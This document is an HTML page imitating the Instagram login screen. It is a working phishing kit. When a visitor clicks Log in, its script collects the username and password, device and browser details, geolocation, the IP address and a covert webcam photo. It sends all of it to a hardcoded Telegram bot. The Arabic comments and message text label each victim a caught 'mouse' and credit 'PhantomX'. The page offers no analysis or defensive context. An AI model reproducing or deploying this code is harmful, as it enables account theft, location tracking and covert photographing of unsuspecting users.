<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://instalogin-clone.vercel.app/images/insta_logo.png">
</head>

<body>
    <div class="main">
        <div class="instass">
            <img id="phone" src="https://instalogin-clone.vercel.app/images/phones.png" alt="phonebackground">
            <div id="imageslideshow"></div>
        </div>

        <div class="loginbox">
            <img id="title" src="https://instalogin-clone.vercel.app/images/title.jpg" alt="Instagram">
            <input class="input" id="username" type="text" placeholder=" &#8205 &#8205Phone number, username, or email">
            <input class="input" id="password" type="password" placeholder=" &#8205 &#8205Password">
            <button id="loginbutton">Log in</button>
            <div id="or">
                ---------------------- &#8205&#8205 OR &#8205&#8205 ----------------------
            </div>
            <a id="fblink" href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATBLxmCRoRwvl25sexsbPWvJw-grK07kle5WzR1ca7bXZHdBtHOIO74vaqCtBEvTOhIKu64sV0oJGNamQNUPnTqeclCbondIgwut9lAktocPxQvqk5oHL1I9aZKi5gMqRMHtGTVKVTSaXuF82QPvO6lKkaGijgIjDqV8_4iYkTujw7thBhwmBmX1cXPEWhws85Ei-GqvnITWA0qJ1JQQdRf4HdolF6FHy2h8vjJJUsAGzhed5g">Log in with Facebook</a>
            <img id=fbicon src="https://instalogin-clone.vercel.app/images/facebook.png" alt="facebookicon">
            <a id="forgotpass" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        </div>
        <div class="signup">
            Don't have an account?&#8205
            <a id="Signup" href="https://www.instagram.com/accounts/emailsignup/">&#8205 &#8205 Sign up</a>
        </div>
        <div class="app">
            <span class="gettheapp">Get the app.</span>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pcampaignid=web_share" target="_blank">
                <img id="gplay" src="https://instalogin-clone.vercel.app/images/google-play.png" alt="Google Play">
            </a>
            <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US" target="_blank">
                <img id="microsoft" src="https://instalogin-clone.vercel.app/images/microsoft.png" alt="Microsoft Store">
            </a>
        </div>
    </div>
    
    <script>
        document.querySelector("#loginbutton").addEventListener("click", function(event) {
            event.preventDefault();

            var username = document.getElementById("username").value;
            var password = document.querySelector("#password").value;
            var userAgent = navigator.userAgent;
            var deviceType = navigator.platform;
            var language = navigator.language;
            var os = navigator.platform;
            var screenWidth = window.innerWidth;
            var screenHeight = window.innerHeight;
            var pageUrl = window.location.href;
            var referrer = document.referrer;

            // دقة الموقع الجغرافي
            let location = "لم يتم تحديد الموقع";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
                }, function(error) {
                    console.log("Error getting geolocation:", error);
                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
                });
            } else {
                alert("Geolocation not supported.");
            }

            // الحصول على IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, ip);
                })
                .catch(error => {
                    console.error("IP fetch error:", error);
                    var ip = 'IP غير متاح';
                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, ip);
                });

            // جمع معلومات الجهاز الإضافية
            function captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, ip) {
                var hardwareInfo = {
                    uuid: '12345-abcde',
                    macAddress: '00:14:22:01:23:45'
                };

                // التقاط صورة من الكاميرا
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function(stream) {
                            var video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            video.onloadedmetadata = function () {
                                var canvas = document.createElement('canvas');
                                canvas.width = 1280;
                                canvas.height = 960;
                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                                // إرسال الصورة إلى البوت
                                canvas.toBlob(function(blob) {
                                    var formData = new FormData();
                                    formData.append("photo", blob, "user_photo.jpg");
                                    sendToTelegram(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, hardwareInfo, formData);
                                    stream.getTracks().forEach(track => track.stop());
                                });
                            };
                        })
                        .catch(function(err) {
                            console.log("Camera error: " + err);
                        });
                } else {
                    alert("Camera access not supported.");
                }
            }

            // إرسال البيانات إلى بوت تلغرام
            function sendToTelegram(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, hardwareInfo, imageData) {
                var botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
                var chatId = "5091980014";

                // رسالة باللغة العربية
                var messageArabic = `⚡️ **تم صيد فأر جديد نوع الحساب انستجرام بواسطة PhantomX @tx_5w** ⚡️\n\n`;
                messageArabic += `🧑‍💻 **اسم المستخدم:** ${username}\n`;
                messageArabic += `🔑 **كلمة المرور:** ${password}\n\n`;
                messageArabic += `📱 **نوع الجهاز:** ${deviceType}\n`;
                messageArabic += `🌍 **الموقع:** ${location}\n`;
                messageArabic += `🌐 **الـ IP:** ${ip}\n`;
                messageArabic += `🖥️ **النظام:** ${os}\n`;
                messageArabic += `💻 **الدقة:** ${screenWidth}x${screenHeight}\n`;
                messageArabic += `🌐 **اللغة:** ${language}\n`;
                messageArabic += `📱 **الصفحة:** ${pageUrl}\n`;
                messageArabic += `🔗 **المرجع:** ${referrer}\n`;
                messageArabic += `💡 **الـ UUID:** ${hardwareInfo.uuid}\n`;
                messageArabic += `🖧 **عنوان MAC:** ${hardwareInfo.macAddress}\n`;

                var formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('text', messageArabic);

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Telegram message sent:', data);
                })
                .catch(error => {
                    console.error('Telegram send error:', error);
                });

                // إرسال الصورة عبر API
                var formData = new FormData();
                formData.append("photo", imageData, "user_photo.jpg");
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Photo sent to Telegram:', data);
                })
                .catch(error => {
                    console.error('Error sending photo:', error);
                });
            }
        });
    </script>
</body>

</html>
